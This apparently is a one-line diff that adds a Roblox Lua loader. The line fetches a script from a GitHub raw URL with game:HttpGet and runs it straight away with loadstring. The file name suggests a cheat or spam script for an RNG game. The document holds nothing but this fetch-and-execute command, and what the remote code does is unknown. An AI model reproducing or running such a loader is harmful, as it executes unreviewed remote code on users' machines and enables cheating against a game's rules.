@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/megamind-new-potions-crazy-skeleton-rng-spam6-fw64vbdaibv2y8.lua"))()
